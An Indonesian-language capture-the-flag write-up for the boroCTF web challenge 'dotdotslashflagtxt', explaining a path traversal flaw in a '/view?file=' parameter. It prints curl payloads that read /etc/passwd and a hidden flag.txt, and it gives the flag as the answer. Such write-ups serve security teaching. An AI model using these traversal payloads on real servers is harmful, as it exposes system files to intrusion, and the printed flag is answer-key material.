# Writeup - dotdotslashflagtxt (boroCTF)

Challenge ini adalah challenge web yang berfokus pada kerentanan **Directory Traversal** atau **Local File Inclusion (LFI)**.

## Analisis
Pada halaman utama, terdapat beberapa link untuk melihat dokumen publik:
- `/view?file=readme.txt`
- `/view?file=notes.txt`
- `/view?file=about.txt`

Parameter `file` pada endpoint `/view` terlihat mencurigakan karena langsung mengambil nama file. 

Di dalam file `about.txt`, terdapat petunjuk:
> "We hold many secrets, like a flag.txt in a folder outside of public view."

Ini mengindikasikan bahwa `flag.txt` berada satu tingkat di atas direktori dokumen publik.

## Eksploitasi
Pertama, saya memverifikasi kerentanan LFI dengan mencoba membaca file sistem `/etc/passwd`:
```bash
curl -s "https://0gil6sh8nlk1.boroctf.com/view?file=../../../../etc/passwd"
```
Hasilnya mengonfirmasi bahwa kita bisa melakukan traversal.

Selanjutnya, sesuai petunjuk di `about.txt`, saya mencoba mengakses `flag.txt` dengan naik satu direktori:
```bash
curl -s "https://0gil6sh8nlk1.boroctf.com/view?file=../flag.txt"
```

Ditemukan flag: `boroCTF{p@th_Tr@v3rs@L_r0Ck5!}`

<FLAG>boroCTF{p@th_Tr@v3rs@L_r0Ck5!}</FLAG>
